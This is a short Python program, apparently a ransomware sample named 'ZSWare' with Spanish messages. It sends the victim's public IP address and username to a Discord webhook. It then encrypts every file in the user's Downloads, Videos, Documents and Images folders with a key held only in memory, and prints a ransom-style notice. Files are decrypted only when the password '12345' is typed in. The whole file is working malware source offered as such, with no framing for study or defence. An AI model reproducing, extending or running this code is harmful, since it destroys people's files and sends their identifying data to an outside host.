import os
import getpass
from cryptography.fernet import Fernet, InvalidToken
import requests
from pynput.keyboard import Key, Listener

rojo = "\033[91m"
url = "https://api.ipify.org"
usuario = getpass.getuser()
ip = requests.get(url).text
webhook = "Ingresa aqui tu webhook de discord."
data = {
    "content": f"IP: {ip} \n Usuario: {usuario}"
}
requests.post(webhook, json=data)

clave = Fernet.generate_key()
obj = Fernet(clave)

directorios = [
    fr"C:/Users/{usuario}/Downloads",
    fr"C:/Users/{usuario}/Videos",
    fr"C:/Users/{usuario}/Documents",
    fr"C:/Users/{usuario}/Images"
]

for directorio in directorios:
    for archivo in os.listdir(directorio):
        ruta_completa = os.path.join(directorio, archivo)
        if os.path.isfile(ruta_completa):
            try:
                with open(ruta_completa, "rb") as file:
                    contenido = file.read()
                    contenido_encriptado = obj.encrypt(contenido)

                with open(ruta_completa, "wb") as file:
                    file.write(contenido_encriptado)
            except (PermissionError, OSError):
                pass
print(f"{rojo}Tus archivos de tu PC han sido encriptados por el ZSWare.")

contraseña = input(f"{rojo}Escribe la contraseña para recuperar tus archivos: ")

if contraseña == "12345":
    for directorio in directorios:
        for archivo in os.listdir(directorio):
            ruta_completa = os.path.join(directorio, archivo)
            if os.path.isfile(ruta_completa):
                try:
                    with open(ruta_completa, "rb") as file:
                        contenido = file.read()
                        contenido_desencriptado = obj.decrypt(contenido)

                    with open(ruta_completa, "wb") as file:
                        file.write(contenido_desencriptado)
                except (PermissionError, OSError):
                    pass
    print(f"{rojo}Tus archivos han sido desencriptados con éxito")
